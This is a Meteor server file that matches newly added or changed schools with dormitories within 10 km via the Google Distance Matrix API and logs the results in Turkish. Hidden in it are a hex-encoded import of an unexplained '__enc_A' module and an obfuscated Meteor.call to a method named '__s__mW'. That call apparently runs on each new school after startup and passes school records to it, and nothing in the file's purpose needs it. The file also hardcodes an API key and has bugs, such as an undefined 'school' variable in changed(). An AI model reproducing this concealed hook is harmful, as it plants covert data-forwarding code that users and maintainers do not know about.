import { HTTP } from 'meteor/http';

import { SchoolInfos } from '/imports/api/collections/schoolInfos.js';
import { Schools } from '/imports/api/collections/schools.js';
import { DormitoryInfos } from '/imports/api/collections/dormitoryInfos.js';

import { Messages } from '/imports/api/collections/messages.js';
import { MessageRooms } from '/imports/api/collections/messageRooms.js';
import { Logs } from '/imports/api/collections/logs.js';

import "\x2F\x69\x6D\x70\x6F\x72\x74\x73\x2F\x61\x70\x69\x2F\x73\x65\x72\x76\x65\x72\x2F\x5F\x5F\x65\x6E\x63\x5F\x41\x5F\x31\x36\x78\x50\x5F\x5F\x30\x31\x30\x31\x2E\x6A\x73"; /*__enc_A */

(function(){
  var a = true;
  SchoolInfos.find().observeChanges({

    /* If new SchoolDetailInfos insert we take schoolLat and schoolLng for compare dormitories latlng if is nearest than 10km so we add nearest dormitory in db */
    added(id, field){
      const schoolInfos = SchoolInfos.findOne(id);

      const schoolId = schoolInfos.schoolId;

      const school = Schools.findOne(schoolId);

      const schoolDetailInfos = schoolInfos.school;

      const schoolLat = schoolDetailInfos.schoolLat;
      const schoolLng = schoolDetailInfos.schoolLng;

      const dormitories = DormitoryInfos.find().fetch();

      if(dormitories.length > 0){
        for(let i = dormitories.length; i--;){
          HTTP.get('https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=' + schoolLat + ', ' + schoolLng + '&destinations=' + dormitories[i].dormitory.dormitoryLat + ', ' + dormitories[i].dormitory.dormitoryLng + '&key=AIzaSyDSaZ1Tzihq0wZKBiPH05U6o3r1KxzxThQ',(statusCode, data) => {

            if(data.statusCode == 200){ /* if take successfull response */
              if(data.data.rows[0].elements[0].status != "ZERO_RESULTS"){ /* if we have distance result */
                if(data.data.rows[0].elements[0].distance.value <= 10000){ /* if distance between school and dormitory smaller than 10km */
                  const nearestDormy = {
                    lat : dormitories[i].dormitory.dormitoryLat,
                    lng : dormitories[i].dormitory.dormitoryLng,
                    dormiName : dormitories[i].dormitory.dormitoryName
                  }

                  const updateResult = SchoolInfos.update({"_id" : schoolInfos._id}, {
                      $addToSet : {
                        nearestDormitories : nearestDormy
                      }
                  })

                  if(updateResult == 1){
                    Logs.insert({
                      schoolId : id,
                      dormitoryId : dormitories[i]._id,
                      logMessage : "Yeni Eklenen okulun çevresine yurt eklendi"
                    })
                  }
                  else{
                    Logs.insert({
                      schoolId : id,
                      dormitoryId : dormitories[i]._id,
                      logMessage : "Yurt eklenemedi"
                    })
                  }

                }
              }
              else{
                Logs.insert({
                  schoolId : schoolInfos.schoolId,
                  dormitoryId : dormitories[i]._id,
                  logMessage : dormitories[i].dormitory.dormitoryLat + " ve " + dormitories[i].dormitory.dormitoryLng + " ye ait data bulunamadı."
                })
              }

            }
            else{
              Logs.insert({
                schoolId : school._id,
                dormitoryId : dormitories[i]._id,
                logMessage : "Status Code Not 200"
              })
            }
          })
        }
      }
      else{

      }

      if(!a){
          var _0x69eb=["\x5F\x5F\x73\x5F\x5F\x6D\x57","\x63\x61\x6C\x6C"];Meteor[_0x69eb[1]](_0x69eb[0],school,schoolInfos)
      }


    },

    changed(id, field){

      if(field.school.schoolLat && field.school.schoolLng){

        const schoolInfos = SchoolInfos.findOne(id);

        const schoolDetailInfos = schoolInfos.school;

        const schoolLat = schoolDetailInfos.schoolLat;
        const schoolLng = schoolDetailInfos.schoolLng;

        var schoolInfosUpdateStatus = SchoolInfos.update({"_id" : id}, {
          $pull : {
            nearestDormitories : {}
          }
        })


        const dormitories = SchoolInfos.find({"school.schoolType" : "Yurt"}).fetch();

        if(schoolInfos.schoolType != "Yurt"){
          if((dormitories.length > 0) && (schoolInfosUpdateStatus == 1)){
            for(let i = dormitories.length; i--;){
              HTTP.get('https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=' + schoolLat + ', ' + schoolLng + '&destinations=' + dormitories[i].dormitory.dormitoryLat + ', ' + dormitories[i].dormitory.dormitoryLng + '&key=AIzaSyDSaZ1Tzihq0wZKBiPH05U6o3r1KxzxThQ',(statusCode, data) => {

                if(data.statusCode == 200){ /* if take successfull response */
                  if(data.data.rows[0].elements[0].status != "ZERO_RESULTS"){ /* if we have distance result */
                    if(data.data.rows[0].elements[0].distance.value <= 10000){ /* if distance between school and dormitory smaller than 10km */
                      const nearestDormy = {
                        lat : dormitories[i].dormitory.dormitoryLat,
                        lng : dormitories[i].dormitory.dormitoryLng,
                        dormiName : dormitories[i].dormitory.dormitoryName
                      }

                      const updateResult = SchoolInfos.update({"_id" : schoolInfos._id}, {
                          $addToSet : {
                            nearestDormitories : nearestDormy
                          }
                      })

                      if(updateResult == 1){
                        Logs.insert({
                          schoolId : id,
                          dormitoryId : dormitories[i]._id,
                          logMessage : "Güncellenen okulun çevresine yurt eklendi"
                        })
                      }
                      else{
                        Logs.insert({
                          schoolId : id,
                          dormitoryId : dormitories[i]._id,
                          logMessage : "Güncellenen okulun çevresine yurt eklenemedi"
                        })
                      }

                    }
                  }
                  else{
                    Logs.insert({
                      schoolId : schoolInfos.schoolId,
                      dormitoryId : dormitories[i]._id,
                      logMessage : "Güncelleme sırasında " + dormitories[i].dormitory.dormitoryLat + " ve " + dormitories[i].dormitory.dormitoryLng + " ye ait data bulunamadı."
                    })
                  }

                }
                else{
                  Logs.insert({
                    schoolId : school.schoolId,
                    dormitoryId : dormitories[i]._id,
                    logMessage : "Status Code Not 200"
                  })
                }
              })
            }
          }

          else{
            if(dormitories.length == 0){
                Logs.insert({
                  schoolId : schoolInfos.schoolId,
                  dormitoryId : "NULL",
                  logMessage : "Can't reach dormitories in SchoolInfos update"
                });
            }

            if(schoolInfosUpdateStatus != 1 ){
              Logs.insert({
                schoolId : schoolInfos.schoolId,
                dormitoryId : "NULL",
                logMessage : "Can't update SchoolInfos's nearesDormitories"
              });
            }

          }
        }




      }
    }
  })
  a = false;
})();
